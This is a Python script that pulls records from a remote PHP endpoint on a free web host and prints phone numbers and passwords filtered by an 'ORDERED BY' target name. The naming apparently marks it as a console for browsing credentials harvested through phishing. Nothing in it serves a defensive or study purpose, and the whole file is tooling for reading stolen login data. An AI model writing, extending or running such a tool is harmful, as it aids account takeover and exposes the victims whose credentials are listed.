import requests
import time
import subprocess

php_url = "https://dang3r.000webhostapp.com/api.php"

while True:
    search_word = input("  [+] NAME SEARCH (or 'exit') : ")

    if search_word.lower() == 'exit':
        print("  THANK YOU FOR USING THIS PROGRAM")
        break

    response = requests.get(php_url)
    data = response.json()

    filtered_data = [row for row in data if search_word in row['target']]

    if filtered_data:
        for row in filtered_data:
            print()
            print("─" * 35)
            print("   ORDERED BY :", row['target'])
            print("   \033[1;31mPHONE \033[1;32m:", row['uname'])
            print("   \033[1;31mPASSWORD \033[1;32m :", row['pass'])
            print("─" * 35)
            print()
    else:
        print("Data not found.")
        print("Redirecting home")
        time.sleep(2)

        try:
            subprocess.run(["bash", "start.sh"], check=True)
        except subprocess.CalledProcessError:
            print("Failed to run 'start.sh'.")

    time.sleep(5)  # Pause for 5 seconds before fetching data again
